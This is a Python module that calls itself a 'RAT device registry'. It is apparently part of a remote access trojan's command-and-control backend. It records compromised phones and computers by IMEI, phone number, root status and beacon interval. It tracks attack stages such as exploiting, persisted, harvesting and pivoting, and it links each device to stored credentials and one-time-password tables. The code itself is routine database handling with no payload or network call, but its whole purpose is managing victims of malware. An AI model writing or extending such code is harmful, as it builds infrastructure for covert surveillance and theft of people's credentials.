"""RAT device registry - persistent device management."""

from __future__ import annotations

import json
import time
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional

from quantum.core.db import execute, execute_one, execute_write, transaction
from quantum.core.ids import new_device_id, correlation_id
from quantum.core.bus import BUS, publish_device_event
from quantum.core.state import DeviceState, STATE_MACHINE


@dataclass
class Device:
    """Device record with all metadata."""
    id: str
    nickname: str = ""
    tags: str = ""
    grp: str = ""
    hostname: str = ""
    platform: str = ""
    arch: str = ""
    os_version: str = ""
    build: str = ""
    vendor: str = ""
    model: str = ""
    serial: str = ""
    mac: str = ""
    imei: str = ""
    msisdn: str = ""
    root: bool = False
    selinux: str = ""
    adb: bool = False
    state: DeviceState = DeviceState.DISCOVERED
    channel: str = ""
    last_seen: float = 0
    first_seen: float = 0
    beacon_s: float = 60
    opsec_score: int = 0
    notes: str = ""
    capabilities: Dict[str, Any] = field(default_factory=dict)
    created: float = 0
    updated: float = 0

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["state"] = self.state.value if isinstance(self.state, DeviceState) else self.state
        d["capabilities"] = json.dumps(self.capabilities)
        return d

    @classmethod
    def from_row(cls, row: Dict) -> "Device":
        caps = {}
        if row.get("capabilities"):
            try:
                caps = json.loads(row["capabilities"])
            except Exception:
                pass
        return cls(
            id=row["id"],
            nickname=row.get("nickname", "") or "",
            tags=row.get("tags", "") or "",
            grp=row.get("grp", "") or "",
            hostname=row.get("hostname", "") or "",
            platform=row.get("platform", "") or "",
            arch=row.get("arch", "") or "",
            os_version=row.get("os_version", "") or "",
            build=row.get("build", "") or "",
            vendor=row.get("vendor", "") or "",
            model=row.get("model", "") or "",
            serial=row.get("serial", "") or "",
            mac=row.get("mac", "") or "",
            imei=row.get("imei", "") or "",
            msisdn=row.get("msisdn", "") or "",
            root=bool(row.get("root", 0)),
            selinux=row.get("selinux", "") or "",
            adb=bool(row.get("adb", 0)),
            state=DeviceState(row.get("state", "DISCOVERED")),
            channel=row.get("channel", "") or "",
            last_seen=row.get("last_seen", 0) or 0,
            first_seen=row.get("first_seen", 0) or 0,
            beacon_s=row.get("beacon_s", 60) or 60,
            opsec_score=row.get("opsec_score", 0) or 0,
            notes=row.get("notes", "") or "",
            capabilities=caps,
            created=row.get("created", 0) or 0,
            updated=row.get("updated", 0) or 0,
        )


def create_device(
    platform: str = "",
    nickname: str = "",
    **kwargs
) -> Device:
    """Create a new device record."""
    now = time.time()
    device_id = kwargs.get("id") or new_device_id(platform)

    device = Device(
        id=device_id,
        platform=platform,
        nickname=nickname,
        first_seen=now,
        last_seen=now,
        created=now,
        updated=now,
        **{k: v for k, v in kwargs.items() if k not in ("id", "platform", "nickname")}
    )

    with transaction() as conn:
        conn.execute(
            """INSERT INTO devices (id, nickname, tags, grp, hostname, platform, arch, os_version,
               build, vendor, model, serial, mac, imei, msisdn, root, selinux, adb, state,
               channel, last_seen, first_seen, beacon_s, opsec_score, notes, capabilities, created, updated)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (device.id, device.nickname, device.tags, device.grp, device.hostname,
             device.platform, device.arch, device.os_version, device.build,
             device.vendor, device.model, device.serial, device.mac, device.imei,
             device.msisdn, int(device.root), device.selinux, int(device.adb),
             device.state.value, device.channel, device.last_seen, device.first_seen,
             device.beacon_s, device.opsec_score, device.notes,
             json.dumps(device.capabilities), device.created, device.updated)
        )

    # Initialize state machine
    STATE_MACHINE._device_states[device_id] = device.state

    publish_device_event(device_id, "created", device.to_dict())
    return device


def get_device(device_id: str) -> Optional[Device]:
    """Get device by ID."""
    row = execute_one("SELECT * FROM devices WHERE id = ?", (device_id,))
    if not row:
        return None
    return Device.from_row(dict(row))


def get_device_by_identifier(identifier: str, value: str) -> Optional[Device]:
    """Get device by a unique identifier (mac, imei, serial, etc.)."""
    valid_identifiers = {"mac", "imei", "serial", "hostname", "nickname"}
    if identifier not in valid_identifiers:
        return None
    row = execute_one(f"SELECT * FROM devices WHERE {identifier} = ?", (value,))
    if not row:
        return None
    return Device.from_row(dict(row))


def list_devices(
    state: Optional[DeviceState] = None,
    platform: Optional[str] = None,
    group: Optional[str] = None,
    limit: int = 100,
    offset: int = 0
) -> List[Device]:
    """List devices with optional filters."""
    sql = "SELECT * FROM devices WHERE 1=1"
    params: List[Any] = []

    if state:
        sql += " AND state = ?"
        params.append(state.value)
    if platform:
        sql += " AND platform = ?"
        params.append(platform)
    if group:
        sql += " AND grp = ?"
        params.append(group)

    sql += " ORDER BY last_seen DESC LIMIT ? OFFSET ?"
    params.extend([limit, offset])

    rows = execute(sql, tuple(params))
    return [Device.from_row(dict(r)) for r in rows]


def update_device(device_id: str, **fields) -> bool:
    """Update device fields."""
    device = get_device(device_id)
    if not device:
        return False

    allowed_fields = {
        "nickname", "tags", "grp", "hostname", "platform", "arch", "os_version",
        "build", "vendor", "model", "serial", "mac", "imei", "msisdn",
        "root", "selinux", "adb", "channel", "beacon_s", "opsec_score", "notes",
        "capabilities"
    }

    updates = []
    params = []
    for key, value in fields.items():
        if key in allowed_fields:
            if key == "capabilities" and isinstance(value, dict):
                # Merge with existing capabilities
                merged = {**device.capabilities, **value}
                value = json.dumps(merged)
            elif key == "root" or key == "adb":
                value = int(bool(value))
            updates.append(f"{key} = ?")
            params.append(value)

    if not updates:
        return False

    updates.append("updated = ?")
    params.append(time.time())
    params.append(device_id)

    with transaction() as conn:
        conn.execute(
            f"UPDATE devices SET {', '.join(updates)} WHERE id = ?",
            tuple(params)
        )

    publish_device_event(device_id, "updated", {"fields": list(fields.keys())})
    return True


def update_device_capabilities(device_id: str, capabilities: Dict[str, Any], merge: bool = True) -> bool:
    """Update device capabilities."""
    device = get_device(device_id)
    if not device:
        return False

    if merge:
        merged = {**device.capabilities, **capabilities}
    else:
        merged = capabilities

    return update_device(device_id, capabilities=merged)


def update_device_state(device_id: str, state: DeviceState, reason: str = "") -> bool:
    """Update device state via state machine."""
    return STATE_MACHINE.transition(device_id, state, reason)


def heartbeat(device_id: str, channel: str = "", **extra) -> bool:
    """Record a device heartbeat/check-in."""
    device = get_device(device_id)
    if not device:
        return False

    now = time.time()
    updates = {
        "last_seen": now,
        "channel": channel or device.channel,
    }
    updates.update(extra)

    # If device was stale, mark as enumerated
    if device.state == DeviceState.STALE:
        STATE_MACHINE.transition(device_id, DeviceState.ENUMERATED, "beacon received")

    return update_device(device_id, **updates)


def delete_device(device_id: str) -> bool:
    """Delete a device and all associated data."""
    device = get_device(device_id)
    if not device:
        return False

    with transaction() as conn:
        # Delete related records
        conn.execute("DELETE FROM tasks WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM telemetry WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM artifacts WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM creds WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM otp WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM geofences WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM alerts WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM transitions WHERE device_id = ?", (device_id,))
        conn.execute("DELETE FROM scans WHERE device_id = ?", (device_id,))
        # Finally delete device
        conn.execute("DELETE FROM devices WHERE id = ?", (device_id,))

    STATE_MACHINE._device_states.pop(device_id, None)

    publish_device_event(device_id, "deleted", {})
    return True


def get_device_count(state: Optional[DeviceState] = None) -> int:
    """Get total device count, optionally filtered by state."""
    if state:
        row = execute_one("SELECT COUNT(*) as c FROM devices WHERE state = ?", (state.value,))
    else:
        row = execute_one("SELECT COUNT(*) as c FROM devices")
    return row["c"] if row else 0


def get_device_summary() -> Dict[str, Any]:
    """Get fleet summary statistics."""
    total = get_device_count()
    online = get_device_count(DeviceState.ENUMERATED) + get_device_count(DeviceState.FINGERPRINTED) + \
             get_device_count(DeviceState.SCANNING) + get_device_count(DeviceState.SCAN_COMPLETE) + \
             get_device_count(DeviceState.EXPLOITING) + get_device_count(DeviceState.COMPROMISED) + \
             get_device_count(DeviceState.PERSISTED) + get_device_count(DeviceState.POST_EX) + \
             get_device_count(DeviceState.HARVESTING) + get_device_count(DeviceState.PIVOTING)
    ghost = get_device_count(DeviceState.GHOST)
    dead = get_device_count(DeviceState.DEAD)
    stale = get_device_count(DeviceState.STALE)
    discovered = get_device_count(DeviceState.DISCOVERED)

    return {
        "total": total,
        "online": online,
        "ghost": ghost,
        "dead": dead,
        "stale": stale,
        "discovered": discovered,
        "by_platform": _get_platform_counts(),
        "by_state": _get_state_counts(),
    }


def _get_platform_counts() -> Dict[str, int]:
    rows = execute("SELECT platform, COUNT(*) as c FROM devices GROUP BY platform")
    return {r["platform"]: r["c"] for r in rows if r["platform"]}


def _get_state_counts() -> Dict[str, int]:
    rows = execute("SELECT state, COUNT(*) as c FROM devices GROUP BY state")
    return {r["state"]: r["c"] for r in rows}


def search_devices(query: str, limit: int = 50) -> List[Device]:
    """Search devices by nickname, hostname, mac, imei, etc."""
    search_term = f"%{query}%"
    rows = execute(
        """SELECT * FROM devices WHERE
           nickname LIKE ? OR hostname LIKE ? OR mac LIKE ? OR imei LIKE ?
           OR serial LIKE ? OR model LIKE ? OR vendor LIKE ?
           ORDER BY last_seen DESC LIMIT ?""",
        (search_term, search_term, search_term, search_term, search_term, search_term, search_term, limit)
    )
    return [Device.from_row(dict(r)) for r in rows]


def get_fleet_for_export() -> List[Dict[str, Any]]:
    """Get all devices for export."""
    devices = list_devices(limit=10000)
    return [d.to_dict() for d in devices]


# Group/Tag management

def add_device_tag(device_id: str, tag: str) -> bool:
    """Add a tag to a device."""
    device = get_device(device_id)
    if not device:
        return False
    tags = set(device.tags.split(",")) if device.tags else set()
    tags.add(tag)
    return update_device(device_id, tags=",".join(sorted(tags)))


def remove_device_tag(device_id: str, tag: str) -> bool:
    """Remove a tag from a device."""
    device = get_device(device_id)
    if not device:
        return False
    tags = set(device.tags.split(",")) if device.tags else set()
    tags.discard(tag)
    return update_device(device_id, tags=",".join(sorted(tags)))


def set_device_group(device_id: str, group: str) -> bool:
    """Set device group."""
    return update_device(device_id, grp=group)


def get_groups() -> List[str]:
    """Get all unique groups."""
    rows = execute("SELECT DISTINCT grp FROM devices WHERE grp != ''")
    return [r["grp"] for r in rows]


def get_all_tags() -> List[str]:
    """Get all unique tags across all devices."""
    rows = execute("SELECT tags FROM devices WHERE tags != ''")
    tags = set()
    for r in rows:
        for tag in r["tags"].split(","):
            tags.add(tag.strip())
    return sorted(tags)


# Device comparison

def compare_devices(device_id1: str, device_id2: str) -> Dict[str, Any]:
    """Compare two devices and return differences."""
    d1 = get_device(device_id1)
    d2 = get_device(device_id2)
    if not d1 or not d2:
        return {"error": "One or both devices not found"}

    diff = {}
    fields = ["platform", "arch", "os_version", "build", "vendor", "model",
              "root", "selinux", "adb", "state", "opsec_score"]
    for field in fields:
        v1 = getattr(d1, field)
        v2 = getattr(d2, field)
        if v1 != v2:
            diff[field] = {"device1": v1, "device2": v2}

    # Compare capabilities
    caps1 = set(d1.capabilities.keys())
    caps2 = set(d2.capabilities.keys())
    if caps1 != caps2:
        diff["capabilities"] = {
            "only_in_1": list(caps1 - caps2),
            "only_in_2": list(caps2 - caps1),
            "common": list(caps1 & caps2),
        }

    return diff